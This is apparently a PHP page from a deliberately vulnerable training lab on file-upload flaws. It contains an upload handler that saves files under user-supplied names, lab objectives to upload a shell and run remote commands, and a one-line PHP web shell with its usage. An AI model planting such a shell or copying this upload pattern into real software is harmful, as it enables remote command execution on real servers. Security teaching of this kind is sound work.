<?php
$page_title = "File Upload Lab 1 - Unrestricted Upload";
require_once '../../../config/env.php';
require_once '../../../template/header.php';

$message = '';
$uploaded_files = [];

// Create uploads directory if it doesn't exist
$upload_dir = '../../../uploads/';
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}

// Get list of uploaded files
if (is_dir($upload_dir)) {
    $files = scandir($upload_dir);
    $uploaded_files = array_filter($files, function($file) {
        return $file !== '.' && $file !== '..';
    });
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    $allowed_types = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    $allowed_exts = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $file_type = mime_content_type($file['tmp_name']);
    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

    if ($file['error'] === UPLOAD_ERR_OK) {
        if (in_array($file_type, $allowed_types) && in_array($file_ext, $allowed_exts)) {
            $filename = $file['name'];
            $destination = $upload_dir . $filename;

            if (move_uploaded_file($file['tmp_name'], $destination)) {
                $message = "File uploaded successfully: " . htmlspecialchars($filename);
            } else {
                $message = "Error uploading file.";
            }
        } else {
            $message = "Invalid file type. Only images and PDF files are allowed.";
        }
    } else {
        $message = "Upload error: " . $file['error'];
    }
}
?>

<div class="container-fluid">
    <div class="row">
        <div class="col-md-3 col-lg-2 px-0">
            <?php include '../../../template/nav.php'; ?>
        </div>
        
        <div class="col-md-9 col-lg-10 mt-60">
            <div class="container-fluid py-4">
                <div class="row">
                    <div class="col-12">
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="<?php echo BASE_URL; ?>">Dashboard</a></li>
                                <li class="breadcrumb-item"><a href="../">File Upload</a></li>
                                <li class="breadcrumb-item active">Lab 1</li>
                            </ol>
                        </nav>
                        
                        <div class="d-flex justify-content-between align-items-center mb-4">
                            <h1 class="h2">Lab 1: Unrestricted File Upload</h1>
                            <span class="lab-difficulty difficulty-easy">Easy</span>
                        </div>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-8">
                        <div class="card mb-4">
                            <div class="card-header">
                                <h5 class="mb-0">File Upload</h5>
                            </div>
                            <div class="card-body">
                                <?php if ($message): ?>
                                    <div class="alert alert-info" role="alert">
                                        <?php echo $message; ?>
                                    </div>
                                <?php endif; ?>
                                
                                <form method="post" enctype="multipart/form-data">
                                    <div class="mb-3">
                                        <label for="file" class="form-label">Choose file:</label>
                                        <input type="file" class="form-control" id="file" name="file" required>
                                    </div>
                                    
                                    <button type="submit" class="btn btn-primary">Upload File</button>
                                </form>
                            </div>
                        </div>
                        
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0">Uploaded Files</h5>
                            </div>
                            <div class="card-body">
                                <?php if (empty($uploaded_files)): ?>
                                    <p class="text-muted">No files uploaded yet.</p>
                                <?php else: ?>
                                    <ul class="list-group">
                                        <?php foreach ($uploaded_files as $file): ?>
                                            <li class="list-group-item">
                                                <a href="../../../uploads/<?php echo htmlspecialchars($file); ?>" target="_blank">
                                                    <?php echo htmlspecialchars($file); ?>
                                                </a>
                                            </li>
                                        <?php endforeach; ?>
                                    </ul>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0">💡 Lab Objectives</h5>
                            </div>
                            <div class="card-body">
                                <ul class="list-unstyled">
                                    <li>✅ Upload PHP shell</li>
                                    <li>✅ Execute remote commands</li>
                                    <li>✅ Understand RCE risks</li>
                                </ul>
                            </div>
                        </div>
                        
                        <div class="card mt-3">
                            <div class="card-header">
                                <h5 class="mb-0">🛠️ Malicious Payloads</h5>
                            </div>
                            <div class="card-body">
                                <div class="accordion" id="payloadsAccordion">
                                    <div class="accordion-item">
                                        <h2 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#shell">
                                                PHP Web Shell
                                            </button>
                                        </h2>
                                        <div id="shell" class="accordion-collapse collapse" data-bs-parent="#payloadsAccordion">
                                            <div class="accordion-body">
                                               - <code>&lt;?php system($_GET['cmd']); ?&gt;</code> <br>
                                               - access uploads/shell.php?cmd=whoami
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php require_once '../../../template/footer.php'; ?>